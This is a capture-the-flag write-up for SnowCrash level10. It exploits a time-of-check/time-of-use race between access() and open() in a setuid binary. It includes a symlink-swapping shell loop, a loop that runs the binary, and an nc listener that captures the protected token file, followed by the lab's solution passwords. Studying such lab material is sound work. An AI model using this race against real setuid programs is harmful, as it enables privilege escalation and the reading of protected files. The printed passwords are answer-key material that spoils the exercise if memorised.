
Overview
In this challenge, we exploit a race condition vulnerability in the level10 binary to access the token file and retrieve the flag. The binary uses the access() system call to check file permissions, which is non-atomic and thus vulnerable to race conditions. By exploiting the time interval between the permission check and the file open operation, we can trick the binary into opening the token file instead of the intended file.

Problem Breakdown
## 1. File Permissions
The ls -l output reveals that the level10 binary and the token file are owned by flag10, with strict permissions on the token file:

```bash
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```
This means only the flag10 user can read the token file. However, we aim to manipulate the level10 binary to open token for us.

Vulnerability: Race Condition with access()

## 2 Using the strings and nm commands, we analyze the level10 binary:

``` bash
level10@SnowCrash:~$ strings level10
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
socket
fflush
exit
htons
connect
puts
__stack_chk_fail
printf
__errno_location
read
stdout
inet_addr
open
access
strerror
__libc_start_main
write
GLIBC_2.4
GLIBC_2.0
PTRh
UWVS
[^_]
%s file host
	sends file to host if you have access to it
Connecting to %s:6969 .. 
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file .. 
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
;*2$"
GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
/usr/lib/gcc/i686-linux-gnu/4.6/include
/usr/include/i386-linux-gnu/bits
/usr/include
/usr/include/netinet
level10.c
stddef.h
types.h
libio.h
sockaddr.h
stdint.h
in.h
socket.h
stdio.h
__quad_t
_old_offset
_IO_save_end
short int
size_t
_IO_write_ptr
main
_IO_buf_base
file
_markers
SOCK_CLOEXEC
SOCK_PACKET
inet_addr
level10.c
sin_family
argv
long long int
_lock
SOCK_DGRAM
_cur_column
_pos
sin_addr
_sbuf
_IO_FILE
sa_family_t
unsigned char
SOCK_RDM
argc
sin_zero
long long unsigned int
uint32_t
_shortbuf
_IO_marker
uint16_t
s_addr
__off64_t
_IO_write_base
_unused2
_IO_read_ptr
__pad5
_IO_buf_end
/home/user/level10
SOCK_SEQPACKET
_next
__pad1
__pad2
__pad3
__pad4
in_addr_t
buffer
__socket_type
SOCK_RAW
_IO_write_end
__off_t
short unsigned int
_chain
sin_port
_IO_backup_base
in_port_t
_flags2
_mode
_IO_read_base
_vtable_offset
SOCK_STREAM
GNU C 4.6.3
_IO_save_base
_fileno
host
_IO_read_end
_flags
sockaddr_in
stdout
SOCK_DCCP
_IO_lock_t
SOCK_NONBLOCK
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.ctors
.dtors
.jcr
.dynamic
.got
.got.plt
.data
.bss
.comment
.debug_aranges
.debug_info
.debug_abbrev
.debug_line
.debug_str
.debug_loc
crtstuff.c
__CTOR_LIST__
__DTOR_LIST__
__JCR_LIST__
__do_global_dtors_aux
completed.6159
dtor_idx.6161
frame_dummy
__CTOR_END__
__FRAME_END__
__JCR_END__
__do_global_ctors_aux
level10.c
__init_array_end
_DYNAMIC
__init_array_start
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
__i686.get_pc_thunk.bx
read@@GLIBC_2.0
data_start
printf@@GLIBC_2.0
fflush@@GLIBC_2.0
_edata
_fini
__stack_chk_fail@@GLIBC_2.4
htons@@GLIBC_2.0
__DTOR_END__
__data_start
puts@@GLIBC_2.0
strerror@@GLIBC_2.0
__gmon_start__
exit@@GLIBC_2.0
__dso_handle
open@@GLIBC_2.0
_IO_stdin_used
__libc_start_main@@GLIBC_2.0
write@@GLIBC_2.0
__libc_csu_init
_end
__errno_location@@GLIBC_2.0
_start
_fp_hw
access@@GLIBC_2.0
stdout@@GLIBC_2.0
__bss_start
main
_Jv_RegisterClasses
socket@@GLIBC_2.0
inet_addr@@GLIBC_2.0
connect@@GLIBC_2.0
_init
```

Next, we check for undefined symbols with:

``` bash
level10@SnowCrash:~$ nm -u level10
         w _Jv_RegisterClasses
         U __errno_location@@GLIBC_2.0
         w __gmon_start__
         U __libc_start_main@@GLIBC_2.0
         U __stack_chk_fail@@GLIBC_2.4
         U access@@GLIBC_2.0
         U connect@@GLIBC_2.0
         U exit@@GLIBC_2.0
         U fflush@@GLIBC_2.0
         U htons@@GLIBC_2.0
         U inet_addr@@GLIBC_2.0
         U open@@GLIBC_2.0
         U printf@@GLIBC_2.0
         U puts@@GLIBC_2.0
         U read@@GLIBC_2.0
         U socket@@GLIBC_2.0
         U strerror@@GLIBC_2.0
         U write@@GLIBC_2.0
```
This indicates the binary uses the access() function, which is crucial for our exploit.
The binary uses the access() system call, which checks if the user has permission to access a file, but it does not ensure that the file remains the same between the check and the open() call.

As noted in the manual for access():

``` bash
man 2 access
```
This function creates a security hole because an attacker can manipulate the file between the access check and the actual open operation, making it vulnerable to a race condition.

Exploiting the Race Condition
The goal is to swap between level10 and token almost instantaneously using symbolic links. This will cause the access() check to pass for level10, but by the time open() is called, the symbolic link will point to token.

# Steps to Exploit
## 3 Listen on Port 6969
The level10 binary attempts to send the file to a specified host on port 6969. We will use nc to set up a listener on that port:

``` bash
nc -lk 6969
```
This will allow us to capture any data sent by the level10 binary.

## 4 Create the Symbolic Link Loop

In the first tab, we create a loop that constantly swaps the symbolic link expl between level10 and token. This leverages the race condition vulnerability between the access() and open() calls:

``` bash
level10@SnowCrash:~$ while true; do ln -fs ~/level10 /tmp/expl; ln -fs ~/token /tmp/expl; done
```

This command rapidly switches the expl symlink between the two files.

## 5: Execute the level10 Binary in a Loop

In the second tab, we execute the level10 binary in a loop, pointing it to the symbolic link. It will keep attempting to open the expl symlink, which rapidly alternates between level10 and token:

``` bash
level10@SnowCrash:~$ while true; do ./level10 /tmp/expl 127.0.0.1; done
```

This will cause the race condition, and eventually, level10 will open the token file instead of itself.

## 6 Capture the Flag

In the third tab, nc will capture the file being sent when the race condition is successful. The output will contain some junk data, but eventually, it will show the token:

``` bash
level10@SnowCrash:~$ nc -lk 6969
[...garbage...]
woupa2yuojeeaaed06riuj63c
[...more garbage...]

```
The string woupa2yuojeeaaed06riuj63c is the password for the flag10 user.

## 7 Enter Level 11

``` bash
level10@SnowCrash:~$ su flag10
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
flag10@SnowCrash:~$ su level11
Password: feulo4b72j7edeahuete3no7c
```